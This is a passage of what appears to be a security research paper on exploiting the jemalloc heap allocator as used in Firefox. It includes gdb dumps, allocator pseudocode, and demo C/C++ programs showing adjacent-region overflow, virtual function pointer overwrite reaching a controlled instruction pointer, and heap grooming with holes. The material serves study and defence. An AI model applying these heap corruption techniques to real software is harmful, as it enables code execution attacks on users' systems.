+add symbol table from file "/dbg/firefox-latest-symbols/firefox-bin.dbg" at
+    .text_addr = 0x80494b0
+add symbol table from file "/dbg/firefox-latest-symbols/libxul.so.dbg" at
+    .text_addr = 0xb5b9a9d0
+...
+[Thread 0xa4ffdb70 (LWP 3533) exited]
+[Thread 0xa57feb70 (LWP 3537) exited]
+[New Thread 0xa57feb70 (LWP 3556)]
+[Thread 0xa57feb70 (LWP 3556) exited]
+
+gdb $ source unmask_jemalloc.py
+gdb $ unmask_jemalloc runs
+
+[jemalloc] [number of arenas:       1]
+[jemalloc] [number of bins:         24]
+[jemalloc] [no magazines/thread caches detected]
+
+[jemalloc] [arena #00] [bin #00] [region size: 0x0004]
+                                            [current run at: 0xa52d9000]
+[jemalloc] [arena #00] [bin #01] [region size: 0x0008]
+                                            [current run at: 0xa37c8000]
+[jemalloc] [arena #00] [bin #02] [region size: 0x0010]
+                                            [current run at: 0xa372c000]
+[jemalloc] [arena #00] [bin #03] [region size: 0x0020]
+                                            [current run at: 0xa334d000]
+[jemalloc] [arena #00] [bin #04] [region size: 0x0030]
+                                            [current run at: 0xa3347000]
+[jemalloc] [arena #00] [bin #05] [region size: 0x0040]
+                                            [current run at: 0xa334a000]
+[jemalloc] [arena #00] [bin #06] [region size: 0x0050]
+                                            [current run at: 0xa3732000]
+[jemalloc] [arena #00] [bin #07] [region size: 0x0060]
+                                            [current run at: 0xa3701000]
+[jemalloc] [arena #00] [bin #08] [region size: 0x0070]
+                                            [current run at: 0xa3810000]
+[jemalloc] [arena #00] [bin #09] [region size: 0x0080]
+                                            [current run at: 0xa3321000]
+[jemalloc] [arena #00] [bin #10] [region size: 0x00f0]
+                                            [current run at: 0xa57c7000]
+[jemalloc] [arena #00] [bin #11] [region size: 0x0100]
+                                            [current run at: 0xa37e9000]
+[jemalloc] [arena #00] [bin #12] [region size: 0x0110]
+                                            [current run at: 0xa5a9b000]
+[jemalloc] [arena #00] [bin #13] [region size: 0x0120]
+                                            [current run at: 0xa56ea000]
+[jemalloc] [arena #00] [bin #14] [region size: 0x0130]
+                                            [current run at: 0xa3709000]
+[jemalloc] [arena #00] [bin #15] [region size: 0x0140]
+                                            [current run at: 0xa382c000]
+[jemalloc] [arena #00] [bin #16] [region size: 0x0150]
+                                            [current run at: 0xa39da000]
+[jemalloc] [arena #00] [bin #17] [region size: 0x0160]
+                                            [current run at: 0xa56ee000]
+[jemalloc] [arena #00] [bin #18] [region size: 0x0170]
+                                            [current run at: 0xa3849000]
+[jemalloc] [arena #00] [bin #19] [region size: 0x0180]
+                                            [current run at: 0xa3a21000]
+[jemalloc] [arena #00] [bin #20] [region size: 0x01f0]
+                                            [current run at: 0xafc51000]
+[jemalloc] [arena #00] [bin #21] [region size: 0x0200]
+                                            [current run at: 0xa3751000]
+[jemalloc] [arena #00] [bin #22] [region size: 0x0400]
+                                            [current run at: 0xa371d000]
+[jemalloc] [arena #00] [bin #23] [region size: 0x0800]
+                                            [current run at: 0xa370d000]
+
+[jemalloc] [run 0xa3347000] [from 0xa3347000 to 0xa3348000L] 
+[jemalloc] [run 0xa371d000] [from 0xa371d000 to 0xa3725000L] 
+[jemalloc] [run 0xa3321000] [from 0xa3321000 to 0xa3323000L] 
+[jemalloc] [run 0xa334a000] [from 0xa334a000 to 0xa334b000L] 
+[jemalloc] [run 0xa370d000] [from 0xa370d000 to 0xa3715000L] 
+[jemalloc] [run 0xa3709000] [from 0xa3709000 to 0xa370d000L] 
+[jemalloc] [run 0xa37c8000] [from 0xa37c8000 to 0xa37c9000L] 
+[jemalloc] [run 0xa5a9b000] [from 0xa5a9b000 to 0xa5a9f000L] 
+[jemalloc] [run 0xa3a21000] [from 0xa3a21000 to 0xa3a27000L] 
+[jemalloc] [run 0xa382c000] [from 0xa382c000 to 0xa3831000L] 
+[jemalloc] [run 0xa3701000] [from 0xa3701000 to 0xa3702000L] 
+[jemalloc] [run 0xa57c7000] [from 0xa57c7000 to 0xa57ca000L] 
+[jemalloc] [run 0xa56ee000] [from 0xa56ee000 to 0xa56f3000L] 
+[jemalloc] [run 0xa39da000] [from 0xa39da000 to 0xa39df000L] 
+[jemalloc] [run 0xa37e9000] [from 0xa37e9000 to 0xa37ed000L] 
+[jemalloc] [run 0xa3810000] [from 0xa3810000 to 0xa3812000L] 
+[jemalloc] [run 0xa3751000] [from 0xa3751000 to 0xa3759000L] 
+[jemalloc] [run 0xafc51000] [from 0xafc51000 to 0xafc58000L] 
+[jemalloc] [run 0xa334d000] [from 0xa334d000 to 0xa334e000L] 
+[jemalloc] [run 0xa372c000] [from 0xa372c000 to 0xa372d000L] 
+[jemalloc] [run 0xa52d9000] [from 0xa52d9000 to 0xa52da000L] 
+[jemalloc] [run 0xa56ea000] [from 0xa56ea000 to 0xa56ee000L] 
+[jemalloc] [run 0xa3732000] [from 0xa3732000 to 0xa3733000L] 
+[jemalloc] [run 0xa3849000] [from 0xa3849000 to 0xa384e000L] 
+
+
+There is also preliminary support for Mac OS X (x86_64), tested on Lion
+10.7.3 with Firefox 11.0. Also, note that Apple's gdb does not have Python
+scripting support, so the following was obtained with a custom-compiled
+gdb:
+
+
+$ open firefox-11.0.app
+
+$ gdb -nx -x ./gdbinit -p 837
+
+...
+Attaching to process 837
+[New Thread 0x2003 of process 837]
+[New Thread 0x2103 of process 837]
+[New Thread 0x2203 of process 837]
+[New Thread 0x2303 of process 837]
+[New Thread 0x2403 of process 837]
+[New Thread 0x2503 of process 837]
+[New Thread 0x2603 of process 837]
+[New Thread 0x2703 of process 837]
+[New Thread 0x2803 of process 837]
+[New Thread 0x2903 of process 837]
+[New Thread 0x2a03 of process 837]
+[New Thread 0x2b03 of process 837]
+[New Thread 0x2c03 of process 837]
+[New Thread 0x2d03 of process 837]
+[New Thread 0x2e03 of process 837]
+Reading symbols from
+/dbg/firefox-11.0.app/Contents/MacOS/firefox...done
+Reading symbols from
+/dbg/firefox-11.0.app/Contents/MacOS/firefox.dSYM/
+Contents/Resources/DWARF/firefox...done.
+0x00007fff8636b67a in ?? () from /usr/lib/system/libsystem_kernel.dylib
+(gdb) source unmask_jemalloc.py
+(gdb) unmask_jemalloc
+
+[jemalloc] [number of arenas:       1]
+[jemalloc] [number of bins:         35]
+[jemalloc] [no magazines/thread caches detected]
+
+[jemalloc] [arena #00] [bin #00] [region size: 0x0008]
+                                            [current run at: 0x108fe0000]
+[jemalloc] [arena #00] [bin #01] [region size: 0x0010]
+                                            [current run at: 0x1003f5000]
+[jemalloc] [arena #00] [bin #02] [region size: 0x0020]
+                                            [current run at: 0x1003bc000]
+[jemalloc] [arena #00] [bin #03] [region size: 0x0030]
+                                            [current run at: 0x1003d7000]
+[jemalloc] [arena #00] [bin #04] [region size: 0x0040]
+                                            [current run at: 0x1054c6000]
+[jemalloc] [arena #00] [bin #05] [region size: 0x0050]
+                                            [current run at: 0x103652000]
+[jemalloc] [arena #00] [bin #06] [region size: 0x0060]
+                                            [current run at: 0x110c9c000]
+[jemalloc] [arena #00] [bin #07] [region size: 0x0070]
+                                            [current run at: 0x106bef000]
+[jemalloc] [arena #00] [bin #08] [region size: 0x0080]
+                                            [current run at: 0x10693b000]
+[jemalloc] [arena #00] [bin #09] [region size: 0x0090]
+                                            [current run at: 0x10692e000]
+[jemalloc] [arena #00] [bin #10] [region size: 0x00a0]
+                                            [current run at: 0x106743000]
+[jemalloc] [arena #00] [bin #11] [region size: 0x00b0]
+                                            [current run at: 0x109525000]
+[jemalloc] [arena #00] [bin #12] [region size: 0x00c0]
+                                            [current run at: 0x1127c2000]
+[jemalloc] [arena #00] [bin #13] [region size: 0x00d0]
+                                            [current run at: 0x106797000]
+[jemalloc] [arena #00] [bin #14] [region size: 0x00e0]
+                                            [current run at: 0x109296000]
+[jemalloc] [arena #00] [bin #15] [region size: 0x00f0]
+                                            [current run at: 0x110aa9000]
+[jemalloc] [arena #00] [bin #16] [region size: 0x0100]
+                                            [current run at: 0x106c70000]
+[jemalloc] [arena #00] [bin #17] [region size: 0x0110]
+                                            [current run at: 0x109556000]
+[jemalloc] [arena #00] [bin #18] [region size: 0x0120]
+                                            [current run at: 0x1092bf000]
+[jemalloc] [arena #00] [bin #19] [region size: 0x0130]
+                                            [current run at: 0x1092a2000]
+[jemalloc] [arena #00] [bin #20] [region size: 0x0140]
+                                            [current run at: 0x10036a000]
+[jemalloc] [arena #00] [bin #21] [region size: 0x0150]
+                                            [current run at: 0x100353000]
+[jemalloc] [arena #00] [bin #22] [region size: 0x0160]
+                                            [current run at: 0x1093d3000]
+[jemalloc] [arena #00] [bin #23] [region size: 0x0170]
+                                            [current run at: 0x10f024000]
+[jemalloc] [arena #00] [bin #24] [region size: 0x0180]
+                                            [current run at: 0x106b58000]
+[jemalloc] [arena #00] [bin #25] [region size: 0x0190]
+                                            [current run at: 0x10f002000]
+[jemalloc] [arena #00] [bin #26] [region size: 0x01a0]
+                                            [current run at: 0x10f071000]
+[jemalloc] [arena #00] [bin #27] [region size: 0x01b0]
+                                            [current run at: 0x109139000]
+[jemalloc] [arena #00] [bin #28] [region size: 0x01c0]
+                                            [current run at: 0x1091c6000]
+[jemalloc] [arena #00] [bin #29] [region size: 0x01d0]
+                                            [current run at: 0x10032a000]
+[jemalloc] [arena #00] [bin #30] [region size: 0x01e0]
+                                            [current run at: 0x1054f9000]
+[jemalloc] [arena #00] [bin #31] [region size: 0x01f0]
+                                            [current run at: 0x10034c000]
+[jemalloc] [arena #00] [bin #32] [region size: 0x0200]
+                                            [current run at: 0x106739000]
+[jemalloc] [arena #00] [bin #33] [region size: 0x0400]
+                                            [current run at: 0x106c68000]
+[jemalloc] [arena #00] [bin #34] [region size: 0x0800]
+                                            [current run at: 0x10367e000]
+
+
+We did our best to test unmask_jemalloc.py on all jemalloc variants,
+however there are probably some bugs left. Feel free to test it and send us
+patches. The development of unmask_jemalloc.py will continue at [UJEM].
+
+
+----[ 2.2 - Algorithms
+
+In this section we present pseudocode the describes the allocation and
+deallocation algorithms implemented by jemalloc. We start with malloc():
+
+
+MALLOC(size):
+    IF size CAN BE SERVICED BY AN ARENA:
+        IF size IS SMALL OR MEDIUM:
+            bin = get_bin_for_size(size)
+
+            IF bin->runcur EXISTS AND NOT FULL:
+                run = bin->runcur
+            ELSE:
+                run = lookup_or_allocate_nonfull_run()
+                bin->runcur = run
+
+            bit = get_first_set_bit(run->regs_mask)
+            region = get_region(run, bit)
+
+        ELIF size IS LARGE:
+            region = allocate_new_run()
+    ELSE:
+        region = allocate_new_chunk()
+    RETURN region
+
+
+calloc() is as you would expect:
+
+
+CALLOC(n, size):
+    RETURN MALLOC(n * size)
+
+
+Finally, the pseudocode for free():
+
+
+FREE(addr):
+    IF addr IS NOT EQUAL TO THE CHUNK IT BELONGS:
+        IF addr IS A SMALL ALLOCATION:
+            run = get_run_addr_belongs_to(addr);
+            bin = run->bin;
+            size = bin->reg_size;
+            element = get_element_index(addr, run, bin)
+            unset_bit(run->regs_mask[element])
+
+        ELSE: /* addr is a large allocation */
+            run = get_run_addr_belongs_to(addr)
+            chunk = get_chunk_run_belongs_to(run)
+            run_index = get_run_index(run, chunk)
+            mark_pages_of_run_as_free(run_index)
+
+            IF ALL THE PAGES OF chunk ARE MARKED AS FREE:
+                unmap_the_chunk_s_pages(chunk)
+
+    ELSE: /* this is a huge allocation */
+        unmap_the_huge_allocation_s_pages(addr)
+
+
+--[ 3 - Exploitation tactics
+
+In this section we analyze the exploitation tactics we have investigated
+against jemalloc. Our goal is to provide to the interested hackers the
+necessary knowledge and tools to develop exploits for jemalloc heap
+corruption bugs.
+
+We also try to approach jemalloc heap exploitation in an abstract way
+initially, identifying 'exploitation primitives' and then continuing into
+the specific required technical details. Chris Valasek and Ryan Smith have
+explored the value of abstracting heap exploitation through primitives
+[CVRS]. The main idea is that specific exploitation techniques eventually
+become obsolete. Therefore it is important to approach exploitation
+abstractly and identify primitives that can applied to new targets. We have
+used this approach before, comparing FreeBSD and Linux kernel heap
+exploitation [HAPF, APHN]. Regarding jemalloc, we analyze adjacent data
+corruption, heap manipulation and metadata corruption exploitation
+primitives.
+
+
+----[ 3.1 - Adjacent region corruption
+
+The main idea behind adjacent heap item corruptions is that you exploit the
+fact that the heap manager places user allocations next to each other
+contiguously without other data in between. In jemalloc regions of the same
+size class are placed on the same bin. In the case that they are also
+placed on the same run of the bin then there are no inline metadata between
+them. In 3.2 we will see how we can force this, but for now let's assume
+that new allocations of the same size class are placed in the same run.
+
+Therefore, we can place a victim object/structure of our choosing in the
+same run and next to the vulnerable object/structure we plan to overflow.
+The only requirement is that the victim and vulnerable objects need to be
+of a size that puts them in the same size class and therefore possibly in
+the same run (again, see the next subsection on how to control this). Since
+there are no metadata between the two regions, we can overflow from the
+vulnerable region to the victim region we have chosen. Usually the victim
+region is something that can help us achieve arbitrary code execution, for
+example function pointers.
+
+In the following contrived example consider that 'three' is your chosen
+victim object and that the vulnerable object is 'two' (full code in file
+test-adjacent.c):
+
+
+char *one, *two, *three;
+
+printf("[*] before overflowing\n");
+
+one = malloc(0x10);
+memset(one, 0x41, 0x10);
+printf("[+] region one:\t\t0x%x: %s\n", (unsigned int)one, one);
+
+two = malloc(0x10);
+memset(two, 0x42, 0x10);
+printf("[+] region two:\t\t0x%x: %s\n", (unsigned int)two, two);
+
+three = malloc(0x10);
+memset(three, 0x43, 0x10);
+printf("[+] region three:\t0x%x: %s\n", (unsigned int)three, three);
+
+[3-1]
+
+printf("[+] copying argv[1] to region two\n");
+strcpy(two, argv[1]);
+
+printf("[*] after overflowing\n");
+printf("[+] region one:\t\t0x%x: %s\n", (unsigned int)one, one);
+printf("[+] region two:\t\t0x%x: %s\n", (unsigned int)two, two);
+printf("[+] region three:\t0x%x: %s\n", (unsigned int)three, three);
+
+[3-2]
+
+free(one);
+free(two);
+free(three);
+
+printf("[*] after freeing all regions\n");
+printf("[+] region one:\t\t0x%x: %s\n", (unsigned int)one, one);
+printf("[+] region two:\t\t0x%x: %s\n", (unsigned int)two, two);
+printf("[+] region three:\t0x%x: %s\n", (unsigned int)three, three);
+
+[3-3]
+
+
+The output (edited for readability):
+
+
+$ ./test-adjacent `python -c 'print "X" * 30'`
+[*] before overflowing
+[+] region one:   0xb7003030: AAAAAAAAAAAAAAAA
+[+] region two:   0xb7003040: BBBBBBBBBBBBBBBB
+[+] region three: 0xb7003050: CCCCCCCCCCCCCCCC
+[+] copying argv[1] to region two
+[*] after overflowing
+[+] region one:   0xb7003030: 
+AAAAAAAAAAAAAAAAXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+[+] region two:   0xb7003040: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+[+] region three: 0xb7003050: XXXXXXXXXXXXXX
+[*] after freeing all regions
+[+] region one:   0xb7003030: 
+AAAAAAAAAAAAAAAAXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+[+] region two:   0xb7003040: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+[+] region three: 0xb7003050: XXXXXXXXXXXXXX
+
+
+Examining the above we can see that region 'one' is at 0xb7003030 and that
+the following two allocations (regions 'two' and 'three') are in the same
+run immediately after 'one' and all three next to each other without any
+metadata in between them. After the overflow of 'two' with 30 'X's we can
+see that region 'three' has been overwritten with 14 'X's (30 - 16 for the
+size of region 'two').
+
+In order to achieve a better understanding of the jemalloc memory layout
+let's fire up gdb with three breakpoints at [3-1], [3-2] and [3-3].
+
+At breakpoint [3-1]:
+
+
+Breakpoint 1, 0x080486a9 in main ()
+gdb $ print arenas[0].bins[2].runcur
+$1 = (arena_run_t *) 0xb7003000
+
+
+At 0xb7003000 is the current run of the bin bins[2] that manages the size
+class 16 in the standalone jemalloc flavor that we have linked against.
+Let's take a look at the run's contents:
+
+
+gdb $ x/40x 0xb7003000
+0xb7003000: 0xb78007ec  0x00000003  0x000000fa  0xfffffff8
+0xb7003010: 0xffffffff  0xffffffff  0xffffffff  0xffffffff
+0xb7003020: 0xffffffff  0xffffffff  0x1fffffff  0x000000ff
+0xb7003030: 0x41414141  0x41414141  0x41414141  0x41414141
+0xb7003040: 0x42424242  0x42424242  0x42424242  0x42424242
+0xb7003050: 0x43434343  0x43434343  0x43434343  0x43434343
+0xb7003060: 0x00000000  0x00000000  0x00000000  0x00000000
+0xb7003070: 0x00000000  0x00000000  0x00000000  0x00000000
+0xb7003080: 0x00000000  0x00000000  0x00000000  0x00000000
+0xb7003090: 0x00000000  0x00000000  0x00000000  0x00000000
+
+
+After some initial metadata (the run's header which we will see in more
+detail at 3.3.1) we have region 'one' at 0xb7003030 followed by regions
+'two' and 'three', all of size 16 bytes. Again we can see that there are no
+metadata between the regions. Continuing to breakpoint [3-2] and examining
+again the contents of the run:
+
+
+Breakpoint 2, 0x08048724 in main ()
+gdb $ x/40x 0xb7003000
+0xb7003000: 0xb78007ec  0x00000003  0x000000fa  0xfffffff8
+0xb7003010: 0xffffffff  0xffffffff  0xffffffff  0xffffffff
+0xb7003020: 0xffffffff  0xffffffff  0x1fffffff  0x000000ff
+0xb7003030: 0x41414141  0x41414141  0x41414141  0x41414141
+0xb7003040: 0x58585858  0x58585858  0x58585858  0x58585858
+0xb7003050: 0x58585858  0x58585858  0x58585858  0x43005858
+0xb7003060: 0x00000000  0x00000000  0x00000000  0x00000000
+0xb7003070: 0x00000000  0x00000000  0x00000000  0x00000000
+0xb7003080: 0x00000000  0x00000000  0x00000000  0x00000000
+0xb7003090: 0x00000000  0x00000000  0x00000000  0x00000000
+
+
+We can see that our 30 'X's (0x58) have overwritten the complete 16 bytes
+of region 'two' at 0xb7003040 and continued for 15 bytes (14 plus a NULL
+from strcpy(3)) in region 'three' at 0xb7003050. From this memory dump it
+should be clear why the printf(3) call of region 'one' after the overflow
+continues to print all 46 bytes (16 from region 'one' plus 30 from the
+overflow) up to the NULL placed by the strcpy(3) call. As it has been
+demonstrated by Peter Vreugdenhil in the context of Internet Explorer heap
+overflows [PV10], this can lead to information leaks from the region that
+is adjacent to the region with the string whose terminating NULL has been
+overwritten. You just need to read back the string and you will get all
+data up to the first encountered NULL.
+
+At breakpoint [3-3] after the deallocation of all three regions:
+
+
+Breakpoint 3, 0x080487ab in main ()
+gdb $ x/40x 0xb7003000
+0xb7003000: 0xb78007ec  0x00000003  0x000000fd  0xffffffff
+0xb7003010: 0xffffffff  0xffffffff  0xffffffff  0xffffffff
+0xb7003020: 0xffffffff  0xffffffff  0x1fffffff  0x000000ff
+0xb7003030: 0x41414141  0x41414141  0x41414141  0x41414141
+0xb7003040: 0x58585858  0x58585858  0x58585858  0x58585858
+0xb7003050: 0x58585858  0x58585858  0x58585858  0x43005858
+0xb7003060: 0x00000000  0x00000000  0x00000000  0x00000000
+0xb7003070: 0x00000000  0x00000000  0x00000000  0x00000000
+0xb7003080: 0x00000000  0x00000000  0x00000000  0x00000000
+0xb7003090: 0x00000000  0x00000000  0x00000000  0x00000000
+
+
+We can see that jemalloc does not clear the freed regions. This behavior of
+leaving stale data in regions that have been freed and can be allocated
+again can lead to easier exploitation of use-after-free bugs (see next
+section).
+
+To explore the adjacent region corruption primitive further in the context
+of jemalloc, we will now look at C++ and virtual function pointers (VPTRs).
+We will only focus on jemalloc-related details; for more general
+information the interested reader should see rix's Phrack paper (the
+principles of which are still applicable) [VPTR]. We begin with a C++
+example that is based on rix's bo2.cpp (file vuln-vptr.cpp in the code
+archive):
+
+
+class base
+{
+    private:
+
+        char buf[32];
+
+    public:
+
+        void
+        copy(const char *str)
+        {
+            strcpy(buf, str);
+        }
+        
+        virtual void
+        print(void)
+        {
+            printf("buf: 0x%08x: %s\n", buf, buf);
+        }
+};
+
+class derived_a : public base
+{
+    public:
+
+        void
+        print(void)
+        {
+            printf("[+] derived_a: ");
+            base::print();
+        }
+};
+
+class derived_b : public base
+{
+    public:
+
+        void
+        print(void)
+        {
+            printf("[+] derived_b: ");
+            base::print();
+        }
+};
+
+int
+main(int argc, char *argv[])
+{
+    base *obj_a;
+    base *obj_b;
+
+    obj_a = new derived_a;
+    obj_b = new derived_b;
+
+    printf("[+] obj_a:\t0x%x\n", (unsigned int)obj_a);
+    printf("[+] obj_b:\t0x%x\n", (unsigned int)obj_b);
+
+    if(argc == 3)
+    {
+        printf("[+] overflowing from obj_a into obj_b\n");
+        obj_a->copy(argv[1]);
+
+        obj_b->copy(argv[2]);
+
+        obj_a->print();
+        obj_b->print();
+
+        return 0;
+    }
+
+
+We have a base class with a virtual function, 'print(void)', and two
+derived classes that overload this virtual function. Then in main, we use
+'new' to create two new objects, one from each of the derived classes.
+Subsequently we overflow the 'buf' buffer of 'obj_a' with 'argv[1]'.
+
+Let's explore with gdb:
+
+
+$ gdb vuln-vptr
+...
+gdb $ r `python -c 'print "A" * 48'` `python -c 'print "B" * 10'`
+...
+0x804862f <main(int, char**)+15>:    movl   $0x24,(%esp)
+0x8048636 <main(int, char**)+22>:    call   0x80485fc <_Znwj@plt>
+0x804863b <main(int, char**)+27>:    movl   $0x80489e0,(%eax)
+gdb $ print $eax
+$13 = 0xb7c01040
+
+
+At 0x8048636 we can see the first 'new' call which takes as a parameter the
+size of the object to create, that is 0x24 or 36 bytes. C++ will of course
+use jemalloc to allocate the required amount of memory for this new object.
+After the call instruction, EAX has the address of the allocated region
+(0xb7c01040) and at 0x804863b the value 0x80489e0 is moved there. This is
+the VPTR that points to 'print(void)' of 'obj_a':
+
+
+gdb $ x/x *0x080489e0
+0x80487d0 <derived_a::print()>: 0xc71cec83
+
+
+Now it must be clear why even though the declared buffer is 32 bytes long,
+there are 36 bytes allocated for the object. Exactly the same as above
+happens with the second 'new' call, but this time the VPTR points to
+'obj_b' (which is at 0xb7c01070):
+
+
+0x8048643 <main(int, char**)+35>:    movl   $0x24,(%esp)
+0x804864a <main(int, char**)+42>:    call   0x80485fc <_Znwj@plt>
+0x804864f <main(int, char**)+47>:    movl   $0x80489f0,(%eax)
+gdb $ x/x *0x080489f0
+0x8048800 <derived_b::print()>: 0xc71cec83
+gdb $ print $eax
+$14 = 0xb7c01070
+
+
+At this point, let's explore jemalloc's internals:
+
+
+gdb $ print arenas[0].bins[5].runcur
+$8 = (arena_run_t *) 0xb7c01000
+gdb $ print arenas[0].bins[5].reg_size
+$9 = 0x30
+gdb $ print arenas[0].bins[4].reg_size
+$10 = 0x20
+gdb $ x/40x 0xb7c01000
+0xb7c01000: 0xb7fd315c  0x00000000  0x00000052  0xfffffffc
+0xb7c01010: 0xffffffff  0x000fffff  0x00000000  0x00000000
+0xb7c01020: 0x00000000  0x00000000  0x00000000  0x00000000
+0xb7c01030: 0x00000000  0x00000000  0x00000000  0x00000000
+0xb7c01040: 0x080489e0  0x00000000  0x00000000  0x00000000
+0xb7c01050: 0x00000000  0x00000000  0x00000000  0x00000000
+0xb7c01060: 0x00000000  0x00000000  0x00000000  0x00000000
+0xb7c01070: 0x080489f0  0x00000000  0x00000000  0x00000000
+0xb7c01080: 0x00000000  0x00000000  0x00000000  0x00000000
+0xb7c01090: 0x00000000  0x00000000  0x00000000  0x00000000
+
+
+Our run is at 0xb7c01000 and the bin is bin[5] which handles regions of
+size 0x30 (48 in decimal). Since our objects are of size 36 bytes they
+don't fit in the previous bin, i.e. bin[4], of size 0x20 (32). We can see
+'obj_a' at 0xb7c01040 with its VPTR (0x080489e0) and 'obj_b' at 0xb7c01070
+with its own VPTR (0x080489f0).
+
+Our next breakpoint is after the overflow of 'obj_a' into 'obj_b' and just
+before the first call of 'print()'. Our run now looks like the following:
+
+
+gdb $ x/40x 0xb7c01000
+0xb7c01000: 0xb7fd315c  0x00000000  0x00000052  0xfffffffc
+0xb7c01010: 0xffffffff  0x000fffff  0x00000000  0x00000000
+0xb7c01020: 0x00000000  0x00000000  0x00000000  0x00000000
+0xb7c01030: 0x00000000  0x00000000  0x00000000  0x00000000
+0xb7c01040: 0x080489e0  0x41414141  0x41414141  0x41414141
+0xb7c01050: 0x41414141  0x41414141  0x41414141  0x41414141
+0xb7c01060: 0x41414141  0x41414141  0x41414141  0x41414141
+0xb7c01070: 0x41414141  0x42424242  0x42424242  0x00004242
+0xb7c01080: 0x00000000  0x00000000  0x00000000  0x00000000
+0xb7c01090: 0x00000000  0x00000000  0x00000000  0x00000000
+gdb $ x/i $eip
+0x80486d1 <main(int, char**)+177>:   call   *(%eax)
+gdb $ print $eax
+$15 = 0x80489e0
+
+
+At 0x080486d1 is the call of 'print()' of 'obj_a'. At 0xb7c01070 we can see
+that we have overwritten the VPTR of 'obj_b' that was in an adjacent region
+to 'obj_a'. Finally, at the call of 'print()' by 'obj_b':
+
+
+gdb $ x/i $eip
+=> 0x80486d8 <main(int, char**)+184>:   call   *(%eax)
+gdb $ print $eax
+$16 = 0x41414141
+
+
+----[ 3.2 - Heap manipulation
+
+In order to be able to arrange the jemalloc heap in a predictable state we
+need to understand the allocator's behavior and use heap manipulation
+tactics to influence it to our advantage. In the context of browsers, heap
+manipulation tactics are usually referred to as 'Heap Feng Shui' after
+Alexander Sotirov's work [FENG].
+
+By 'predictable state' we mean that the heap must be arranged as reliably
+as possible in a way that we can position data where we want. This enables
+us to use the tactic of corrupting adjacent regions of the previous
+paragraph, but also to exploit use-after-free bugs. In use-after-free
+bugs a memory region is allocated, used, freed and then used again due
+to a bug. In such a case if we know the region's size we can manipulate
+the heap to place data of our own choosing in the freed region's memory
+slot on its run before it is used again. Upon its subsequent incorrect use
+the region now has our data that can help us hijack the flow of execution.
+
+To explore jemalloc's behavior and manipulate it into a predictable
+state we use an algorithm similar to the one presented in [HOEJ]. Since
+in the general case we cannot know beforehand the state of the runs of
+the class size we are interested in, we perform many allocations of this
+size hoping to cover the holes (i.e. free regions) in the existing runs
+and get a fresh run. Hopefully the next series of allocations we will
+perform will be on this fresh run and therefore will be sequential. As
+we have seen, sequential allocations on a largely empty run are also
+contiguous. Next, we perform such a series of allocations controlled by
+us. In the case we are trying to use the adjacent regions corruption
+tactic, these allocations are of the victim object/structure we have
+chosen to help us gain code execution when corrupted.
+
+The following step is to deallocate every second region in this last series
+of controlled victim allocations. This will create holes in between the
+victim objects/structures on the run of the size class we are trying to
+manipulate. Finally, we trigger the heap overflow bug forcing, due to the
+state we have arranged, jemalloc to place the vulnerable objects in holes 
+on the target run overflowing into the victim objects.
+
+Let's demonstrate the above discussion with an example (file test-holes.c
+in the code archive):
+
+
+#define TSIZE   0x10            /* target size class */
+#define NALLOC  500             /* number of allocations */
+#define NFREE   (NALLOC / 10)   /* number of deallocations */
+
+char *foo[NALLOC];
+char *bar[NALLOC];
+
+printf("step 1: controlled allocations of victim objects\n");
+
+for(i = 0; i < NALLOC; i++)
+{
+    foo[i] = malloc(TSIZE);
+    printf("foo[%d]:\t\t0x%x\n", i, (unsigned int)foo[i]);
+}
+
+printf("step 2: creating holes in between the victim objects\n");
+
+for(i = (NALLOC - NFREE); i < NALLOC; i += 2)
+{
+    printf("freeing foo[%d]:\t0x%x\n", i, (unsigned int)foo[i]);
+    free(foo[i]);
+}
+
+printf("step 3: fill holes with vulnerable objects\n");
+
+for(i = (NALLOC - NFREE + 1); i < NALLOC; i += 2)
+{
+    bar[i] = malloc(TSIZE);
+    printf("bar[%d]:\t0x%x\n", i, (unsigned int)bar[i]);
+}
+
+
+jemalloc's behavior can be observed in the output, remember that our target
+size class is 16 bytes:
+
+
+$ ./test-holes
+step 1: controlled allocations of victim objects
+foo[0]:             0x40201030
+foo[1]:             0x40201040
+foo[2]:             0x40201050
+foo[3]:             0x40201060
+foo[4]:             0x40201070
+foo[5]:             0x40201080
+foo[6]:             0x40201090
+foo[7]:             0x402010a0
+
+...
+
+foo[447]:           0x40202c50
+foo[448]:           0x40202c60
+foo[449]:           0x40202c70
+foo[450]:           0x40202c80
+foo[451]:           0x40202c90
+foo[452]:           0x40202ca0
+foo[453]:           0x40202cb0
+foo[454]:           0x40202cc0
+foo[455]:           0x40202cd0
+foo[456]:           0x40202ce0
+foo[457]:           0x40202cf0
+foo[458]:           0x40202d00
+foo[459]:           0x40202d10
+foo[460]:           0x40202d20
+
+...
+
+step 2: creating holes in between the victim objects
+freeing foo[450]:   0x40202c80
+freeing foo[452]:   0x40202ca0
+freeing foo[454]:   0x40202cc0
+freeing foo[456]:   0x40202ce0
+freeing foo[458]:   0x40202d00
+freeing foo[460]:   0x40202d20
+freeing foo[462]:   0x40202d40
+freeing foo[464]:   0x40202d60
+freeing foo[466]:   0x40202d80
+freeing foo[468]:   0x40202da0
+freeing foo[470]:   0x40202dc0
+freeing foo[472]:   0x40202de0
+freeing foo[474]:   0x40202e00
+freeing foo[476]:   0x40202e20
+freeing foo[478]:   0x40202e40
+freeing foo[480]:   0x40202e60
+freeing foo[482]:   0x40202e80
+freeing foo[484]:   0x40202ea0
+freeing foo[486]:   0x40202ec0
+freeing foo[488]:   0x40202ee0
+freeing foo[490]:   0x40202f00
+freeing foo[492]:   0x40202f20
+freeing foo[494]:   0x40202f40
+freeing foo[496]:   0x40202f60
+freeing foo[498]:   0x40202f80
+
+step 3: fill holes with vulnerable objects
+bar[451]:           0x40202c80
+bar[453]:           0x40202ca0
+bar[455]:           0x40202cc0
+bar[457]:           0x40202ce0
+bar[459]:           0x40202d00
+bar[461]:           0x40202d20
+bar[463]:           0x40202d40
+bar[465]:           0x40202d60
+bar[467]:           0x40202d80
+bar[469]:           0x40202da0
+bar[471]:           0x40202dc0
+bar[473]:           0x40202de0
+bar[475]:           0x40202e00
+bar[477]:           0x40202e20
+bar[479]:           0x40202e40
+bar[481]:           0x40202e60
+bar[483]:           0x40202e80
+bar[485]:           0x40202ea0
+bar[487]:           0x40202ec0
+bar[489]:           0x40202ee0
+bar[491]:           0x40202f00
+bar[493]:           0x40202f20
+bar[495]:           0x40202f40
+bar[497]:           0x40202f60
